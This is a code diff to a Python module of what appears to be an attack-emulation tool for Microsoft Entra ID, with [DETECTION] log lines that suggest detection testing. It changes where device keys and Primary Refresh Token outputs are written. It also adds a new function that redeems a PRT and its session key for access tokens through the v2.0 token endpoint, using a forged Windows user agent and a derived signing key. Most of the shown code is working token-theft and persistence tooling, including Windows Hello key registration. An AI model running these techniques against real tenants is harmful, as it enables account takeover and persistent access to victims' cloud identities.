@@ -44,6 +44,35 @@ def _build_transport_key_blob(public_key):
     return base64.b64encode(header + exponent + modulus).decode()
 
 
+def _artifact_write_path(params, filename):
+    """Where a technique writes a file it produces (a device .key/.p7b, a WHfB
+    key). With --artifact-dir set, the engine passes it through as
+    ``_artifact_dir``; a relative name is placed there so it sits beside the
+    run's JSON outputs and a later step's ``${x.key_path}`` reference resolves.
+    An absolute path is left exactly as the caller set it."""
+    run_dir = params.get("_artifact_dir")
+    if run_dir and filename and not os.path.isabs(filename):
+        os.makedirs(run_dir, exist_ok=True)
+        return os.path.join(run_dir, filename)
+    return filename
+
+
+def _artifact_read_path(params, filename):
+    """Where a technique looks for a file an earlier step wrote. Prefer the path
+    as given; if that misses and --artifact-dir is set, try the same name under
+    it, so a standalone step with a literal ``key_path:`` still finds a file a
+    previous run left in the artifact dir. Falls back to the original path so
+    the caller's ``open()`` raises a clear error."""
+    if filename and os.path.isfile(filename):
+        return filename
+    run_dir = params.get("_artifact_dir")
+    if run_dir and filename and not os.path.isabs(filename):
+        candidate = os.path.join(run_dir, filename)
+        if os.path.isfile(candidate):
+            return candidate
+    return filename
+
+
 def register_device(auth_config, params, token=False):
     """
     Registers a new device object in Entra ID via the Device Registration Service (DRS)
@@ -126,8 +155,8 @@ def register_device(auth_config, params, token=False):
         logging.error(f"Device registration response did not include a certificate: {result}")
         return
 
-    key_path = params.get("key_out", f"{returned_device_id}_device.key")
-    cert_path = params.get("cert_out", f"{returned_device_id}_device.p7b")
+    key_path = _artifact_write_path(params, params.get("key_out", f"{returned_device_id}_device.key"))
+    cert_path = _artifact_write_path(params, params.get("cert_out", f"{returned_device_id}_device.p7b"))
 
     with open(key_path, "wb") as f:
         f.write(private_key.private_bytes(
@@ -142,9 +171,11 @@ def register_device(auth_config, params, token=False):
     logging.info(f"Registered device '{device_name}' with DeviceId {returned_device_id}")
     logging.info(f"Device private key saved to {key_path}, device certificate saved to {cert_path}")
 
+    # Only serializable values here: the output dict is written to
+    # --artifact-dir as JSON. The private key lives on disk at key_path, which
+    # is what every downstream step loads it from.
     return {
         "device_id": returned_device_id,
-        "private_key": private_key,
         "certificate_b64": cert_b64,
         "key_path": key_path,
         "cert_path": cert_path,
@@ -165,8 +196,8 @@ def get_prt_with_refresh_token(params):
 	logging.info("Running the request_prt technique")
 
 	# Load device credentials
-	key_path = params.get("key_path")
-	cert_path = params.get("cert_path")
+	key_path = _artifact_read_path(params, params.get("key_path"))
+	cert_path = _artifact_read_path(params, params.get("cert_path"))
 	session = params.get("session", "nosession")
 	tenant_id = params.get("tenant_id", "common")
 	refresh_token = params.get("refresh_token")
@@ -353,33 +384,19 @@ def get_prt_with_refresh_token(params):
 		logging.error(f"Failed to decrypt session key: {e}")
 		return
 
-	# Determine output path
-	prt_out = params.get("prt_out", f"{device_id}_prt.json")
+	output = {
+		"device_id": device_id,
+		"session_key": base64.b64encode(session_key).decode('utf-8'),
+		"tgt_ad": tgt_ad,
+		"tgt_cloud": tgt_cloud,
+		"refresh_token": refresh_token,
+		"id_token": result.get("id_token"),
+		"obtained_at": datetime.utcnow().isoformat(),
+		"expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
+	}
 
-	# Write PRT components to output file
-	try:
-		output = {
-			"device_id": device_id,
-			"session_key": base64.b64encode(session_key).decode('utf-8'),  # Save decrypted and encoded
-			"tgt_ad": tgt_ad,
-			"tgt_cloud": tgt_cloud,
-			"refresh_token": refresh_token,
-			"id_token": result.get("id_token"),
-			"obtained_at": datetime.utcnow().isoformat(),
-			"expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
-		}
-
-		with open(prt_out, "w") as f:
-			json.dump(output, f, indent=2)
-
-		logging.info(f"Successfully obtained PRT for device {device_id}")
-		logging.info(f"PRT and decrypted session key saved to {prt_out}")
-
-		return output
-
-	except Exception as e:
-		logging.error(f"Failed to write PRT output to {prt_out}: {e}")
-		return
+	logging.info(f"Successfully obtained PRT for device {device_id}")
+	return output
 
 def _calculate_derived_key_v2(session_key, context, jwtbody):
 	"""
@@ -539,12 +556,6 @@ def create_whfb_key(params):
 	"""
 	logging.info("Running the create_whfb_key technique")
 
-	session = params.get("session", "nosession")
-	if session == "nosession":
-		logging.error("session parameter is required")
-		return
-
-	# Get access token from session (passed by main orchestrator)
 	access_token = params.get("access_token")
 	if not access_token:
 		logging.error("access_token is required to register Windows Hello key")
@@ -609,7 +620,7 @@ def create_whfb_key(params):
 
 	# Step 4: Save private key to disk for later use
 	logging.debug("Step 4: Persisting private key to disk")
-	key_out = params.get("key_out", "whfb_private.key")
+	key_out = _artifact_write_path(params, params.get("key_out", "whfb_private.key"))
 
 	try:
 		with open(key_out, "wb") as f:
@@ -644,47 +655,34 @@ def get_token_with_prt(params):
 	Based on ROADtools aad_brokerplugin_prt_auth pattern:
 	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L1037
 
-	1. Load PRT and session key from disk
-	2. Get nonce from srv_challenge
+	1. Get nonce from srv_challenge
 	3. Create JWT payload signed with derived key
 	4. Submit to token endpoint
 	5. Decrypt response to extract access token
 
 	Parameters:
-		prt_file: Path to saved PRT file (from request_prt)
+		prt: Primary Refresh Token (the PRT refresh_token) to redeem
+		session_key: base64 decrypted PRT session key
 		client_id: Client ID to request token for
 		resource: Resource/scope to request access to
 		tenant_id: Tenant ID
-		token_out: Output file for token (optional)
 	"""
 	logging.info("Running the get_token_with_prt technique")
 
-	prt_file = params.get("prt_file")
+	prt = params.get("prt")
+	session_key_b64 = params.get("session_key")
 	client_id = params.get("client_id")
 	resource = params.get("resource")
 	tenant_id = params.get("tenant_id", "common")
-	token_out = params.get("token_out", "token_with_prt.json")
 
-	if not all([prt_file, client_id, resource]):
-		logging.error("prt_file, client_id, and resource parameters are required")
+	if not all([prt, session_key_b64, client_id, resource]):
+		logging.error("prt, session_key, client_id, and resource parameters are required")
 		return
 
-	# Step 1: Load PRT and decrypted session key from disk
 	try:
-		with open(prt_file, "r") as f:
-			prt_data = json.load(f)
-		prt = prt_data.get("refresh_token")
-		session_key_b64 = prt_data.get("session_key")
-
-		if not prt or not session_key_b64:
-			logging.error("PRT file missing refresh_token or session_key")
-			return
-
-		# Decode the base64-encoded session key
 		session_key = base64.b64decode(session_key_b64)
-		logging.info(f"Loaded PRT from {prt_file}")
 	except Exception as e:
-		logging.error(f"Failed to load PRT: {e}")
+		logging.error(f"Failed to decode session_key: {e}")
 		return
 
 	# Step 2: Request nonce from srv_challenge
@@ -800,18 +798,180 @@ def get_token_with_prt(params):
 			output["access_token"] = response_data['access_token']
 			logging.info(f" ACCESS TOKEN OBTAINED! Length: {len(response_data['access_token'])} chars")
 
-		# Extract other useful tokens
 		for key in ['refresh_token', 'id_token', 'expires_in']:
 			if key in response_data:
-				if key == 'refresh_token':
-					output[key] = response_data[key][:50] + "..." if len(response_data[key]) > 50 else response_data[key]
-				else:
-					output[key] = response_data[key]
+				output[key] = response_data[key]
 
-		with open(token_out, "w") as f:
-			json.dump(output, f, indent=2)
+		return output
 
-		logging.info(f"Token response saved to {token_out}")
+	except Exception as e:
+		logging.error(f"Exception during token request: {e}")
+		return
+
+
+def get_token_with_prt_v2(params):
+	"""
+	Use a saved PRT to obtain an access token for a specific scope/client.
+
+	v2.0 counterpart of get_token_with_prt: hits ``/oauth2/v2.0/token`` with a
+	``scope`` in place of the v1.0 ``resource``, and the signed request carries
+	``prt_protocol_version=3.0`` instead of ``windows_api_version``.
+
+	Loads a pre-decrypted PRT session key from disk and uses it to sign requests
+	and decrypt responses for token acquisition.
+
+	Based on ROADtools aad_brokerplugin_prt_auth_v3 pattern:
+	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L1037
+
+	1. Get nonce from srv_challenge
+	3. Create JWT payload signed with derived key
+	4. Submit to token endpoint
+	5. Decrypt response to extract access token
+
+	Parameters:
+		prt: Primary Refresh Token (the PRT refresh_token) to redeem
+		session_key: base64 decrypted PRT session key
+		client_id: Client ID to request token for
+		scope: v2.0 scope to request access to (e.g. https://graph.microsoft.com/.default)
+		tenant_id: Tenant ID
+		redirect_uri: optional; only sent if given. Must be a redirect URI
+			registered on client_id, or Entra returns AADSTS50011. Not needed
+			for a .default scope on a preauthorized first-party client.
+	"""
+	logging.info("Running the get_token_with_prt_v2 technique")
+
+	prt = params.get("prt")
+	session_key_b64 = params.get("session_key")
+	client_id = params.get("client_id")
+	scope = params.get("scope")
+	tenant_id = params.get("tenant_id", "common")
+	redirect_uri = params.get("redirect_uri")
+
+	if not all([prt, session_key_b64, client_id, scope]):
+		logging.error("prt, session_key, client_id, and scope parameters are required")
+		return
+
+	try:
+		session_key = base64.b64decode(session_key_b64)
+	except Exception as e:
+		logging.error(f"Failed to decode session_key: {e}")
+		return
+
+	nonce_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/token"
+	token_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
+	headers = {
+		"Content-Type": "application/x-www-form-urlencoded",
+		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+	}
+
+	# Step 2: Request nonce from srv_challenge
+	nonce_body = {
+		"grant_type": "srv_challenge",
+		"windows_api_version": "2.0",
+		"client_id": "29d9ed98-a469-4536-ade2-f981bc1d605e",
+	}
+
+	try:
+		nonce_response = requests.post(nonce_endpoint, headers=headers, data=nonce_body, timeout=10)
+		if nonce_response.status_code != 200:
+			logging.error(f"srv_challenge failed: {nonce_response.status_code}")
+			return
+
+		nonce = nonce_response.json().get("Nonce")
+		if not nonce:
+			logging.error("No nonce received")
+			return
+
+	except Exception as e:
+		logging.error(f"Exception during nonce request: {e}")
+		return
+
+	# Step 3: Create JWT payload signed with derived key
+	now = int(time.time())
+	jwt_payload = {
+		"client_id": client_id,
+		"request_nonce": nonce,
+		"scope": scope,
+		"grant_type": "refresh_token",
+		"refresh_token": prt,
+		"win_ver": "10.0.19041.868",
+		"aud": token_endpoint,
+		"iss": "29d9ed98-a469-4536-ade2-f981bc1d605e",
+		"iat": now,
+		"exp": now + 3600,
+	}
+	if redirect_uri:
+		jwt_payload["redirect_uri"] = redirect_uri
+
+	# Create temp JWT to extract body for KDF
+	jwt_context = os.urandom(24)
+	headers_for_temp = {
+		'ctx': base64.b64encode(jwt_context).decode('utf-8'),
+		'kdf_ver': 2
+	}
+
+	try:
+		temp_jwt = jwt.encode(jwt_payload, os.urandom(32), algorithm='HS256', headers=headers_for_temp)
+		jbody = temp_jwt.split('.')[1]
+		jwtbody = base64.urlsafe_b64decode(jbody + ('=' * (len(jbody) % 4)))
+
+		derived_key = _calculate_derived_key_v2(session_key, jwt_context, jwtbody)
+		request_jwt = jwt.encode(jwt_payload, derived_key, algorithm='HS256', headers=headers_for_temp)
+
+	except Exception as e:
+		logging.error(f"Failed to create/sign JWT: {e}")
+		return
+
+	# Step 4: Submit signed JWT to token endpoint
+	token_body = {
+		'prt_protocol_version': '3.0',
+		'grant_type': 'urn:ietf:params:oauth:grant-type:jwt-bearer',
+		'request': request_jwt,
+		'client_info': '1'
+	}
+
+	try:
+		token_response = requests.post(token_endpoint, headers=headers, data=token_body, timeout=10)
+
+		if token_response.status_code not in (200, 201):
+			logging.error(f"Token request failed: {token_response.status_code}")
+			try:
+				error_data = token_response.json()
+				logging.error(f"Error: {error_data.get('error')}")
+				logging.error(f"Description: {error_data.get('error_description')}")
+			except:
+				logging.error(f"Response: {token_response.text[:200]}")
+			return
+
+		# Step 5: Decrypt response using session key
+		plaintext = _decrypt_response_with_derived_key(token_response.text, session_key)
+		if not plaintext:
+			logging.error("Failed to decrypt response")
+			return
+
+		# Step 6: Parse decrypted response and extract tokens
+		try:
+			response_data = json.loads(plaintext)
+		except Exception as e:
+			logging.error(f"Failed to parse decrypted response as JSON: {e}")
+			return
+
+		# Extract tokens from response
+		output = {
+			"status": " Token request successful",
+			"client_id": client_id,
+			"scope": scope,
+			"response_keys": list(response_data.keys()),
+		}
+
+		# Extract access token
+		if 'access_token' in response_data:
+			output["access_token"] = response_data['access_token']
+			logging.info(f" ACCESS TOKEN OBTAINED! Length: {len(response_data['access_token'])} chars")
+
+		for key in ['refresh_token', 'id_token', 'expires_in']:
+			if key in response_data:
+				output[key] = response_data[key]
 
 		return output
 
@@ -831,12 +991,11 @@ def get_prt_with_whfb_key(params):
 	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L242
 
 	Parameters:
-		whfb_key_file: Path to saved Windows Hello private key file
+		whfb_key_path: Path to saved Windows Hello private key file
 		key_path: Path to device private key (for signing token request)
 		cert_path: Path to device certificate (for token request headers)
 		username: Username for JWT assertion (typically user@domain)
 		tenant_id: Tenant ID
-		prt_out: Output file for PRT (optional)
 
 	Returns:
 		Dictionary with PRT and session key details
@@ -844,21 +1003,20 @@ def get_prt_with_whfb_key(params):
 	logging.info("Running the get_prt_with_whfb_key technique")
 
 	# Load parameters
-	whfb_key_file = params.get("whfb_key_file")
-	key_path = params.get("key_path")
-	cert_path = params.get("cert_path")
+	whfb_key_path = _artifact_read_path(params, params.get("whfb_key_path"))
+	key_path = _artifact_read_path(params, params.get("key_path"))
+	cert_path = _artifact_read_path(params, params.get("cert_path"))
 	username = params.get("username")
 	tenant_id = params.get("tenant_id", "common")
-	prt_out = params.get("prt_out", "whfb_prt.json")
 
-	if not all([whfb_key_file, key_path, cert_path, username]):
-		logging.error("whfb_key_file, key_path, cert_path, and username parameters are required")
+	if not all([whfb_key_path, key_path, cert_path, username]):
+		logging.error("whfb_key_path, key_path, cert_path, and username parameters are required")
 		return
 
 	# Step 1: Load Windows Hello for Business private key
 	logging.debug("Step 1: Loading Windows Hello for Business private key")
 	try:
-		with open(whfb_key_file, "rb") as f:
+		with open(whfb_key_path, "rb") as f:
 			whfb_key_pem = f.read()
 		whfb_key = serialization.load_pem_private_key(
 			whfb_key_pem,
@@ -1084,28 +1242,18 @@ def get_prt_with_whfb_key(params):
 		logging.error(f"Failed to decrypt session key: {e}")
 		return
 
-	try:
-		output = {
-			"device_id": username,
-			"session_key": base64.b64encode(session_key).decode('utf-8'),
-			"tgt_ad": tgt_ad,
-			"tgt_cloud": tgt_cloud,
-			"refresh_token": refresh_token,
-			"id_token": result.get("id_token"),
-			"obtained_at": datetime.utcnow().isoformat(),
-			"expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
-			"authentication_method": "Windows Hello for Business"
-		}
+	output = {
+		"device_id": username,
+		"session_key": base64.b64encode(session_key).decode('utf-8'),
+		"tgt_ad": tgt_ad,
+		"tgt_cloud": tgt_cloud,
+		"refresh_token": refresh_token,
+		"id_token": result.get("id_token"),
+		"obtained_at": datetime.utcnow().isoformat(),
+		"expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
+		"authentication_method": "Windows Hello for Business"
+	}
 
-		with open(prt_out, "w") as f:
-			json.dump(output, f, indent=2)
-
-		logging.info(f" Successfully obtained PRT using Windows Hello for Business key")
-		logging.info(f"PRT and decrypted session key saved to {prt_out}")
-		logging.info(f"[DETECTION] Obtained PRT using Windows Hello for Business key for {username}")
-
-		return output
-
-	except Exception as e:
-		logging.error(f"Failed to write PRT output: {e}")
-		return
+	logging.info(f" Successfully obtained PRT using Windows Hello for Business key")
+	logging.info(f"[DETECTION] Obtained PRT using Windows Hello for Business key for {username}")
+	return output
